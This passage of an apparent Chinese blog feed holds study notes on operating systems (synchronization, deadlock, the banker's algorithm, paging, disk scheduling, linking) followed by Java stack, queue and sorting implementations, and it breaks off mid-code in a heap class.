insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。 1234567891011121314monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否者其它进程永远不能使用管程。 管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。 使用管程实现生成者-消费者问题 123456789101112131415161718192021222324252627282930313233343536373839404142// 管程monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;end monitor;// 生产者客户端procedure producerbegin while true do begin item = produce_item; ProducerConsumer.insert(item); endend;// 消费者客户端procedure consumerbegin while true do begin item = ProducerConsumer.remove; consume_item(item); endend; 经典同步问题生产者和消费者问题前面已经讨论过了。 1. 读者-写者问题允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。 一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。 1234567891011121314151617181920212223242526typedef int semaphore;semaphore count_mutex = 1;semaphore data_mutex = 1;int count = 0;void reader() &#123; while(TRUE) &#123; down(&amp;count_mutex); count++; if(count == 1) down(&amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问 up(&amp;count_mutex); read(); down(&amp;count_mutex); count--; if(count == 0) up(&amp;data_mutex); up(&amp;count_mutex); &#125;&#125;void writer() &#123; while(TRUE) &#123; down(&amp;data_mutex); write(); up(&amp;data_mutex); &#125;&#125; 2. 哲学家进餐问题 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。 下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。 123456789101112#define N 5void philosopher(int i) &#123; while(TRUE) &#123; think(); take(i); // 拿起左边的筷子 take((i+1)%N); // 拿起右边的筷子 eat(); put(i); put((i+1)%N); &#125;&#125; 为了防止死锁的发生，可以设置两个条件： 必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 123456789101112131415161718192021222324252627282930313233343536373839404142#define N 5#define LEFT (i + N - 1) % N // 左邻居#define RIGHT (i + 1) % N // 右邻居#define THINKING 0#define HUNGRY 1#define EATING 2typedef int semaphore;int state[N]; // 跟踪每个哲学家的状态semaphore mutex = 1; // 临界区的互斥semaphore s[N]; // 每个哲学家一个信号量void philosopher(int i) &#123; while(TRUE) &#123; think(); take_two(i); eat(); put_tow(i); &#125;&#125;void take_two(int i) &#123; down(&amp;mutex); state[i] = HUNGRY; test(i); up(&amp;mutex); down(&amp;s[i]);&#125;void put_tow(i) &#123; down(&amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(&amp;mutex);&#125;void test(i) &#123; // 尝试拿起两把筷子 if(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123; state[i] = EATING; up(&amp;s[i]); &#125;&#125; 进程通信进程同步与进程通信很容易混淆，它们的区别在于： 进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。 进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。 1. 信号量在进程同步中介绍的信号量也属于进程通信的一种方式，但是属于低级别的进程通信，因为它传输的信息非常小。 2. 消息传递操作系统提供了用于通信的通道（Channel），进程可以通过读写这个通道进行通信。 （一）管道 写进程在管道的尾端写入数据，读进程在管道的首端读出数据。管道提供了简单的流控制机制，进程试图读空管道时，在有数据写入管道前，进程将一直阻塞。同样地，管道已经满时，进程再试图写管道，在其它进程从管道中移走数据之前，写进程将一直阻塞。 Linux 中管道通过空文件实现。 管道有三种： 普通管道：有两个限制，一是只能单向传输；二是只能在父子进程之间使用； 流管道：去除第一个限制，支持双向传输； 命名管道：去除第二个限制，可以在不相关进程之间进行通信。 （二）消息队列 消息队列克服了信号量传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。 （三）套接字 套接字也是一种进程间通信机制，与其它通信机制不同的是，它可用于不同机器间的进程通信。 3. 共享内存操作系统建立一块共享内存，并将其映射到每个进程的地址空间上，进程就可以直接对这块共享内存进行读写。 共享内存是最快的进程通信方式。 三、死锁死锁的必要条件 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。 死锁的处理方法1. 鸵鸟策略把头埋在沙子里，假装根本没发生问题。 因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。 大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。 2. 死锁检测与死锁恢复不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。 （一）每种类型一个资源的死锁检测 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。 图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。 每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。 （二）每种类型多个资源的死锁检测 上图中，有三个进程四个资源，每个数据代表的含义如下： E 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量 进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。 算法总结如下： 每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。 （三）死锁恢复 利用抢占恢复 利用回滚恢复 通过杀死进程恢复 3. 死锁预防在程序运行之前预防发生死锁。 （一）破坏互斥条件 例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。 （二）破坏占有和等待条件 一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。 （三）破坏不可抢占条件 （四）破坏环路等待 给资源统一编号，进程只能按编号顺序来请求资源。 4. 死锁避免在程序运行时避免发生死锁。 （一）安全状态 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。 定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。 安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。 （二）单个资源的银行家算法 一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。 上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。 （三）多个资源的银行家算法 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。 检查一个状态是否安全的算法如下： 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。 如果一个状态不是安全的，需要拒绝进入这个状态。 四、内存管理虚拟内存虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。 为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到一部分不在物理内存中的地址空间时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。 从上面的描述中可以看出，虚拟内存允许程序地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序称为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。 分页系统地址映射 内存管理单元（MMU）：管理着地址空间和物理内存的转换。 页表（Page table）：页（地址空间）和页框（物理内存空间）的映射表。例如下图中，页表的第 0 个表项为 010，表示第 0 个页映射到第 2 个页框。页表项的最后一位用来标记页是否在内存中。 下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。因此对于虚拟地址（0010 000000000100），前 4 位是用来存储页面号，而后 12 位存储在页中的偏移量。 （0010 000000000100）根据前 4 位得到页号为 2，读取表项内容为（110 1），它的前 3 为为页框号，最后 1 位表示该页在内存中。最后映射得到物理内存地址为（110 000000000100）。 页面置换算法在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。 页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。 1. 最佳 Optimal 所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。 是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。 2. 先进先出 FIFO, First In First Out 所选择换出的页面是最先进入的页面。 该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。 3. 最近未使用 NRU, Not Recently Used 首先，系统为毎一页面设置了两个状态位。当页面被访问 (读或写) 时设置 R 位; 当页面 (即修改页面) 被写入时设置 M 位。当启动一个进程时，它的所有页面的两个位都由操作系统设置成 0，R 位被定期地 (比如在每次时钟中断时) 清零，以区别最近没有被访问的页面和被访问的页面。 当发生缺页中断时，操作系统检査所有的页面并根据它们当前的 R 位和 M 位的值，把它们分为 4 类: 第 0 类: 没有被访问，没有被修改 第 1 类: 没有被访问，已被修改 第 2 类: 已被访问，没有被修改 第 3 类: 已被访问，已被修改 NRU 算法随机地从类编号最小的非空类中挑选一个页面淘汰之。 算法隐含的意思是，在最近一个时钟滴答中 (典型的时间是大约 20ms) 淘汰一个没有被访问的已修改页面要比一个被频繁使用的 “十净” 页面好。NRU 主要优点是易于理解和能够有效地被实现，虽然它的性能不是最好的，但是已经够用了。 4. 最近最久未使用 LRU, Least Recently Used 虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。 可以用栈来实现该算法，栈中存储页面的页面号。当进程访问一个页面时，将该页面的页面号从栈移除，并将它压入栈顶。这样，最近被访问的页面总是在栈顶，而最近最久未使用的页面总是在栈底。 5. 第二次机会算法FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改： 当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉; 如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索 第二次机会算法就是寻找一个最近的时钟间隔以来没有被访问过的页面。如果所有的页面都被访问过了，该算法就简化为纯粹的 FIFO 算法。 6. 时钟 Clock 需要用到一个访问位，当一个页面被访问时，将访问位置为 1。 首先，将内存中的所有页面链接成一个循环队列，当缺页中断发生时，检查当前指针所指向页面的访问位，如果访问位为 0，就将该页面换出；否则将该页的访问位设置为 0，给该页面第二次的机会，移动指针继续检查。 分段虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。 下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。 分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。 段页式程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。 分页与分段的比较 对程序员的透明性：分页透明，但是分段需要程序员显示划分每个段。 地址空间的维度：分页是一维地址空间，分段是二维的。 大小是否可以改变：页的大小不可变，段的大小可以动态改变。 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。 五、设备管理磁盘调度算法当多个进程同时请求访问磁盘时，需要进行磁盘调度来控制对磁盘的访问。 磁盘调度的主要目标是使磁盘的平均寻道时间最少。 1. 先来先服务 FCFS, First Come First Served 根据进程请求访问磁盘的先后次序来进行调度。优点是公平和简单，缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。 2. 最短寻道时间优先 SSTF, Shortest Seek Time First 要求访问的磁道与当前磁头所在磁道距离最近的优先进行调度。这种算法并不能保证平均寻道时间最短，但是比 FCFS 好很多。 3. 扫描算法 SCAN SSTF 会出现饥饿现象。考虑以下情况，新进程请求访问的磁道与磁头所在磁道的距离总是比一个在等待的进程来的近，那么等待的进程会一直等待下去。 SCAN 算法在 SSTF 算法之上考虑了磁头的移动方向，要求所请求访问的磁道在磁头当前移动方向上才能够得到调度。因为考虑了移动方向，那么一个进程请求访问的磁道一定会得到调度。 当一个磁头自里向外移动时，移到最外侧会改变移动方向为自外向里，这种移动的规律类似于电梯的运行，因此又常称 SCAN 算法为电梯调度算法。 4. 循环扫描算法 CSCAN CSCAN 对 SCAN 进行了改动，要求磁头始终沿着一个方向移动。 六、链接编译系统以下是一个 hello.c 程序： 1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello, world\n"); return 0;&#125; 在 Unix 系统上，由编译器把源文件转换为目标文件。 1gcc -o hello hello.c 这个过程大致如下： 预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编文件； 汇编阶段：将汇编文件翻译成可重定向目标文件，它是二进制的； 链接阶段：将可重定向目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。 目标文件 可执行目标文件：可以直接在内存中执行； 可重定向目标文件：可与其它可重定向目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：可以在运行时被动态加载进内存并链接； 静态链接静态连接器以一组可重定向目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务： 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 重定位：编译器和汇编器生成从地址 0 开始的代码和数据节，链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。 动态链接静态库有以下两个问题： 当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点： 在给定的文件系统中一个库只有一个 .so 文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节的一个副本可以被不同的正在运行的进程共享。 转自： 计算机操作系统]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法总概览]]></title>
    <url>%2F2018%2F07%2F21%2F%E7%AE%97%E6%B3%95%E6%80%BB%E6%A6%82%E8%A7%88%2F</url>
    <content type="text"><![CDATA[算法总概览。 三、栈和队列栈First-In-Last-Out 123456789public interface MyStack&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; MyStack&lt;Item&gt; push(Item item); Item pop() throws Exception; boolean isEmpty(); int size();&#125; 1. 数组实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class ArrayStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; // 栈元素数组 private Item[] a = (Item[]) new Object[1]; // 只能通过转型来创建泛型数组 // 元素数量 private int N = 0; @Override public MyStack&lt;Item&gt; push(Item item) &#123; check(); a[N++] = item; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = a[--N]; check(); a[N] = null; // 避免对象游离 return item; &#125; private void check() &#123; if (N &gt;= a.length) resize(2 * a.length); else if (N &gt; 0 &amp;&amp; N &lt;= a.length / 4) resize(a.length / 2); &#125; /** * 调整数组大小，使得栈具有伸缩性 */ private void resize(int size) &#123; Item[] tmp = (Item[]) new Object[size]; for (int i = 0; i &lt; N; i++) tmp[i] = a[i]; a = tmp; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; // 返回逆序遍历的迭代器 return new Iterator&lt;Item&gt;() &#123; private int i = N; @Override public boolean hasNext() &#123; return i &gt; 0; &#125; @Override public Item next() &#123; return a[--i]; &#125; &#125;; &#125;&#125; 2. 链表实现需要使用链表的头插法来实现，因为头插法中最后压入栈的元素在链表的开头，它的 next 指针指向前一个压入栈的元素，在弹出元素使就可以通过 next 指针遍历到前一个压入栈的元素从而让这个元素称为新的栈顶元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class ListStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; private Node top = null; private int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public MyStack&lt;Item&gt; push(Item item) &#123; Node newTop = new Node(); newTop.item = item; newTop.next = top; top = newTop; N++; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = top.item; top = top.next; N--; return item; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; private Node cur = top; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = cur.next; return item; &#125; &#125;; &#125;&#125; 队列First-In-First-Out 下面是队列的链表实现，需要维护 first 和 last 节点指针，分别指向队首和队尾。 这里需要考虑 first 和 last 指针哪个作为链表的开头。因为出队列操作需要让队首元素的下一个元素成为队首，所以需要容易获取下一个元素，而链表的头部节点的 next 指针指向下一个元素，因此可以让 first 指针链表的开头。 123456789public interface MyQueue&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; int size(); boolean isEmpty(); MyQueue&lt;Item&gt; add(Item item); Item remove() throws Exception;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class ListQueue&lt;Item&gt; implements MyQueue&lt;Item&gt; &#123; private Node first; private Node last; int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public MyQueue&lt;Item&gt; add(Item item) &#123; Node newNode = new Node(); newNode.item = item; newNode.next = null; if (isEmpty()) &#123; last = newNode; first = newNode; &#125; else &#123; last.next = newNode; last = newNode; &#125; N++; return this; &#125; @Override public Item remove() throws Exception &#123; if (isEmpty()) throw new Exception("queue is empty"); Node node = first; first = first.next; N--; if (isEmpty()) last = null; return node.item; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; Node cur = first; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = cur.next; return item; &#125; &#125;; &#125;&#125; 五、排序待排序的元素需要实现 Java 的 Comparable 接口，该接口有 compareTo() 方法，可以用它来判断两个元素的大小关系。 研究排序算法的成本模型时，计算的是比较和交换的次数。 使用辅助函数 less() 和 swap() 来进行比较和交换的操作，使得代码的可读性和可移植性更好。 123456789private static boolean less(Comparable v, Comparable w) &#123; return v.compareTo(w) &lt; 0;&#125;private static void swap(Comparable[] a, int i, int j) &#123; Comparable t = a[i]; a[i] = a[j]; a[j] = t;&#125; 选择排序选择出数组中的最小元素，将它与数组的第一个元素交换位置。再从剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。不断进行这样的操作，直到将整个数组排序。 123456789101112public class Selection &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 0; i &lt; N; i++) &#123; int min = i; for (int j = i + 1; j &lt; N; j++) if (less(a[j], a[min])) min = j; swap(a, i, min); &#125; &#125;&#125; 选择排序需要 ~N2/2 次比较和 ~N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要这么多的比较和交换操作。 冒泡排序通过从左到右不断交换相邻逆序的相邻元素，在一轮的交换之后，可以让未排序的元素上浮到最右侧，是的右侧是已排序的。 在一轮交换中，如果没有发生交换，就说明数组已经是有序的，此时可以直接退出。 123456789101112131415public class Bubble &#123; public static void sort(Comparable[] a) &#123; int N = a.length; boolean hasSorted = false; for (int i = 0; i &lt; N &amp;&amp; !hasSorted; i++) &#123; hasSorted = true; for (int j = 0; j &lt; N - i - 1; j++) &#123; if (less(a[j + 1], a[j])) &#123; hasSorted = false; swap(a, j, j + 1); &#125; &#125; &#125; &#125;&#125; 插入排序插入排序从左到右进行，每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左部数组依然有序。 第 j 元素是通过不断向左比较并交换来实现插入过程：当第 j 元素小于第 j - 1 元素，就将它们的位置交换，然后令 j 指针向左移动一个位置，不断进行以上操作。 12345678public class Insertion &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 1; i &lt; N; i++) for (int j = i; j &gt; 0 &amp;&amp; less(a[j], a[j - 1]); j--) swap(a, j, j - 1); &#125;&#125; 对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。 插入排序的复杂度取决于数组的初始顺序，如果数组已经部分有序了，逆序较少，那么插入排序会很快。 平均情况下插入排序需要 ~N2/4 比较以及 ~N2/4 次交换； 最坏的情况下需要 ~N2/2 比较以及 ~N2/2 次交换，最坏的情况是数组是倒序的； 最好的情况下需要 N-1 次比较和 0 次交换，最好的情况就是数组已经有序了。 希尔排序对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素，每次只能将逆序数量减少 1。 希尔排序的出现就是为了改进插入排序的这种局限性，它通过交换不相邻的元素，每次可以将逆序数量减少大于 1。 希尔排序使用插入排序对间隔 h 的序列进行排序。通过不断减小 h，最后令 h=1，就可以使得整个数组是有序的。 123456789101112131415public class Shell &#123; public static void sort(Comparable[] a) &#123; int N = a.length; int h = 1; while (h &lt; N / 3) h = 3 * h + 1; // 1, 4, 13, 40, ... while (h &gt;= 1) &#123; for (int i = h; i &lt; N; i++) for (int j = i; j &gt;= h &amp;&amp; less(a[j], a[j - h]); j -= h) swap(a, j, j - h); h = h / 3; &#125; &#125;&#125; 希尔排序的运行时间达不到平方级别，使用递增序列 1, 4, 13, 40, … 的希尔排序所需要的比较次数不会超过 N 的若干倍乘于递增序列的长度。后面介绍的高级排序算法只会比希尔排序快两倍左右。 归并排序归并排序的思想是将数组分成两部分，分别进行排序，然后归并起来。 1. 归并方法归并方法将数组中两个已经排序的部分归并成一个。 123456789101112131415161718192021public class MergeSort &#123; private static Comparable[] aux; private static void merge(Comparable[] a, int l, int m, int h) &#123; int i = l, j = m + 1; for (int k = l; k &lt;= h; k++) aux[k] = a[k]; // 将数据复制到辅助数组 for (int k = l; k &lt;= h; k++) &#123; if (i &gt; m) a[k] = aux[j++]; else if (j &gt; h) a[k] = aux[i++]; else if (aux[i].compareTo(a[j]) &lt;= 0) a[k] = aux[i++]; // 先进行这一步，保证稳定性 else a[k] = aux[j++]; &#125; &#125;&#125; 2. 自顶向下归并排序 12345678910111213public static void sort(Comparable[] a) &#123; aux = new Comparable[a.length]; sort(a, 0, a.length - 1);&#125;private static void sort(Comparable[] a, int l, int h) &#123; if (h &lt;= l) return; int mid = l + (h - l) / 2; sort(a, l, mid); sort(a, mid + 1, h); merge(a, l, mid, h);&#125; 因为每次都将问题对半分成两个子问题，而这种对半分的算法复杂度一般为 O(NlogN)，因此该归并排序方法的时间复杂度也为 O(NlogN)。 3. 自底向上归并排序先归并那些微型数组，然后成对归并得到的微型数组。 123456789public static void sort(Comparable[] a) &#123; int N = a.length; aux = new Comparable[N]; for (int sz = 1; sz &lt; N; sz += sz) &#123; for (int lo = 0; lo &lt; N - sz; lo += sz + sz) &#123; merge(a, lo, lo + sz - 1, Math.min(lo + sz + sz - 1, N - 1)); &#125; &#125;&#125; 快速排序1. 基本算法 归并排序将数组分为两个子数组分别排序，并将有序的子数组归并使得整个数组排序； 快速排序通过一个切分元素将数组分为两个子数组，左子数组小于等于切分元素，右子数组大于等于切分元素，将这两个子数组排序也就将整个数组排序了。 1234567891011121314151617181920public class QuickSort &#123; public static void sort(Comparable[] a) &#123; shuffle(a); sort(a, 0, a.length - 1); &#125; private static void sort(Comparable[] a, int l, int h) &#123; if (h &lt;= l) return; int j = partition(a, l, h); sort(a, l, j - 1); sort(a, j + 1, h); &#125; private static void shuffle(Comparable[] array) &#123; List&lt;Comparable&gt; list = Arrays.asList(array); Collections.shuffle(list); list.toArray(array); &#125;&#125; 2. 切分取 a[lo] 作为切分元素，然后从数组的左端向右扫描直到找到第一个大于等于它的元素，再从数组的右端向左扫描找到第一个小于等于它的元素，交换这两个元素，并不断进行这个过程，就可以保证左指针 i 的左侧元素都不大于切分元素，右指针 j 的右侧元素都不小于切分元素。当两个指针相遇时，将切分元素 a[lo] 和 a[j] 交换位置。 12345678910111213private static int partition(Comparable[] a, int l, int h) &#123; int i = l, j = h + 1; Comparable v = a[l]; while (true) &#123; while (less(a[++i], v) &amp;&amp; i != h) ; while (less(v, a[--j]) &amp;&amp; j != l) ; if (i &gt;= j) break; swap(a, i, j); &#125; swap(a, l, j); return j;&#125; 3. 性能分析快速排序是原地排序，不需要辅助数组，但是递归调用需要辅助栈。 快速排序最好的情况下是每次都正好能将数组对半分，这样递归调用次数才是最少的。这种情况下比较次数为 CN=2CN/2+N，复杂度为 O(NlogN)。 最坏的情况下，第一次从最小的元素切分，第二次从第二小的元素切分，如此这般。因此最坏的情况下需要比较 N2/2。为了防止数组最开始就是有序的，在进行快速排序时需要随机打乱数组。 4. 算法改进（一）切换到插入排序 因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序。 （二）三数取中 最好的情况下是每次都能取数组的中位数作为切分元素，但是计算中位数的代价很高。人们发现取 3 个元素并将大小居中的元素作为切分元素的效果最好。 （三）三向切分 对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于、等于和大于切分元素。 三向切分快速排序对于只有若干不同主键的随机数组可以在线性时间内完成排序。 1234567891011121314151617181920212223public class Quick3Way &#123; public static void sort(Comparable[] a) &#123; sort(a, 0, a.length - 1); &#125; private static void sort(Comparable[] a, int l, int h) &#123; if (h &lt;= l) return; int lt = l, i = l + 1, gt = h; Comparable v = a[l]; while (i &lt;= gt) &#123; int cmp = a[i].compareTo(v); if (cmp &lt; 0) swap(a, lt++, i++); else if (cmp &gt; 0) swap(a, i, gt--); else i++; &#125; sort(a, l, lt - 1); sort(a, gt + 1, h); &#125;&#125; 5. 基于切分的快速选择算法快速排序的 partition() 方法，会返回一个整数 j 使得 a[l..j-1] 小于等于 a[j]，且 a[j+1..h] 大于等于 a[j]，此时 a[j] 就是数组的第 j 大元素。 可以利用这个特性找出数组的第 k 个元素。 12345678910111213public static Comparable select(Comparable[] a, int k) &#123; int l = 0, h = a.length - 1; while (h &gt; l) &#123; int j = partition(a, l, h); if (j == k) return a[k]; else if (j &gt; k) h = j - 1; else l = j + 1; &#125; return a[k];&#125; 该算法是线性级别的，因为每次正好将数组二分，那么比较的总次数为 (N+N/2+N/4+..)，直到找到第 k 个元素，这个和显然小于 2N。 堆排序1. 堆堆的某个节点的值总是大于等于子节点的值，并且堆是一颗完全二叉树。 堆可以用数组来表示，因为堆是一种完全二叉树，而完全二叉树很容易就存储在数组中。位置 k 的节点的父节点位置为 k/2，而它的两个子节点的位置分别为 2k 和 2k+1。这里不使用数组索引为 0 的位置，是为了更清晰地描述节点的位置关系。 123456789101112131415161718192021222324252627public class Heap &#123; private Comparable[] heap; private int N = 0; public Heap(int maxN) &#123; heap = new Comparable[maxN + 1]; N = maxN; &#125; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; private 